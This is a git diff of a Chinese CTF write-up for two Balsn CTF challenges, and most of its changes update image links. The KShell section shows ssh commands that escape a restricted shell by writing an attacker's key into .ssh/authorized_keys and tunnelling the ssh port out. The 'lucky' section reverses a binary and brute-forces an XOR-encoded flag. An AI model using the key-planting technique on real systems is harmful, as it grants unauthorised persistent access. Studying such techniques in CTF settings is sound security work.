@@ -21,11 +21,12 @@ toc:
 
 ## KShell
 
-![](https://hackmd.io/_uploads/rkolW8TWT.png)
-
+![image](https://github.com/user-attachments/assets/37a8e79e-ad82-44d4-9139-8b23fa340fba)
 
 連到 `nc kshell.balsnctf.com 7122` 會有一個受限的 shell 要做逃脫，用 `help` 看能用的指令只有這些，沒有 pipe 沒有 redirect
-![](https://hackmd.io/_uploads/r1ex_ra-p.png)
+
+![image](https://github.com/user-attachments/assets/b97f8b7b-1a6f-4a73-a621-760c864e93da)
+
 裡面最複雜的應該是 `ssh` 所以從他開刀。思路大概是想辦法找到 `自由寫檔` 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。
 原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 `<username>@<hostname> Permission denied (publickey)` 的 log。
 ```bash
@@ -44,11 +45,14 @@ ssh -E .ssh/authorized_keys -F "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxC
 ```
 pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M=
 ```
+
 於是就構建了下面的 payload
+
 ```bash
 ssh -o UserKnownHostsFile=.ssh/authorized_keys -o HostKeyAlias=pty root@<remote hostname>
 ```
-![](https://hackmd.io/_uploads/Sy9R1IT-a.png)
+
+![image](https://github.com/user-attachments/assets/e2f52ba8-5b2d-4b2a-998d-e020045083cf)
 
 接下來就是從裡面打 ssh tunnel 出來了。
 ```bash
@@ -66,23 +70,26 @@ flag: `BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}`
 
 ## lucky
 他給一個執行檔，跑起來會卡住。 string 一下
-![](https://hackmd.io/_uploads/HyP-iUaWp.png)
+
+![image](https://github.com/user-attachments/assets/36acc2e3-3b8c-4708-a58d-79ae679a736c)
 
 然後用 IDA 開查一下 `Lucky! flag is %s` 的位置。
-![](https://hackmd.io/_uploads/S1OviIT-T.png)
+
+![image](https://github.com/user-attachments/assets/20589c7f-20fc-46d1-8242-7ec25b10bb68)
 
 然後直接解壞給我看...
-![](https://hackmd.io/_uploads/HkcKsUTb6.png)
+
+![image](https://github.com/user-attachments/assets/c9dfc48b-31ae-44e0-8f91-bd6d73216625)
 
 用 Ghidra 開
 
-![](https://hackmd.io/_uploads/BJeZpU6-6.png)
+![image](https://github.com/user-attachments/assets/1a5e83c2-520a-4517-b6d5-f701849f635b)
 
 太棒了沒解壞
 讀一下看起來是會先進到一個跑 10000000000000000 次的迴圈，裡面每次都會生兩個 uint 隨機數 % 100000000 以後再開平方並加起來檢查是否 > 9999999999999999 如果是的話就把 `IVar4` - 1 ，然後每個迴圈都會做一次 + 1 （其實本質上還是生成隨機數）。
 離開迴圈後，把這個數 * 4 + -30000000000000000 然後轉字串接著將位置在 0x498040 ~ 0x498067 的資料與這個數字字串做 xor 就能得到 Flag 了（雖說這樣講但到頭來那個數字還是得用猜的）。
 
-![](https://hackmd.io/_uploads/BJHy0v6Zp.png)
+![image](https://github.com/user-attachments/assets/9c065411-9445-4091-9235-fbe4903282fa)
 
 雖然要猜，但是一些部分還是有跡可循，首先數字字串並沒有 0x28 那麼長，xor 的過程中 index 到 0xf 就會回到 0x0 了所以一定有些部分是用一樣的數字然後 flag 是 BALSN{printable+} 所以我們可以用前面 `BALSN{` 跟後面 `}` 取得那個位置的數字，接著找其他也用這個數字的位置換成 flag 我們就可以得出這個。
 ```python
@@ -112,7 +119,9 @@ for a in range(len(data)):
 print(ans)
 
 ```
-![](https://hackmd.io/_uploads/ryvs4Dp-a.png)
+
+![image](https://github.com/user-attachments/assets/831deb54-e3d8-4db6-9dc8-c8a44cf2688c)
+
 然後未知的部分我們可以用爆的看看，首先找到未知的位置從 0~9 測一次會不會出現 printable 的字元如果有我們再用相同的數字測看看用同樣數字 index 的其他位置是不是有 printable 的字元，然後把所有符合規則的可能印出來。但是因為這個可能還是很龐大，所以我們可以先把 printable 的字元 list 縮小一下
 ```python
 #printable = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
@@ -171,7 +180,7 @@ trycheck(checktmp, 0)
 `b'BALSN{nU\x00\x00_1s_s0oO0O_1oP\x00\x00\x00\x00\x00\x00_iN_c7F!!}'`
 更新一下 `prefix` 再測一次
 
-![](https://hackmd.io/_uploads/S1JstvaWa.png)
+![image](https://github.com/user-attachments/assets/62752e70-9ba5-4c0a-9b23-3b86620d12d8)
 
 這次的結果數量就少很多，可以試著把 printable 的字元增加一些或全部使用。
 執行後看起來還是沒有合理的單字，可能是有單字是錯的，所以把不太像的字元拔掉
@@ -181,7 +190,8 @@ trycheck(checktmp, 0)
 更新一下 `prefix` 再測一次，結果中有一部份的結果最前面的單字是 `lUcK` 符合這個題目的主題，因此得到
 `b'BALSN{lUcK_1s_s0oO0O_1\x00\x00\x00\x00\x00\x00\x00\x00_iN_c7F!\x00}'`
 更新一下 `prefix` 再測一次
-![](https://hackmd.io/_uploads/HkCKswpWp.png)
+
+![image](https://github.com/user-attachments/assets/88dc842a-fa0a-483c-9afd-ec1be6a48aee)
 
 看起來都合理的單字且能組成一個句子。
 
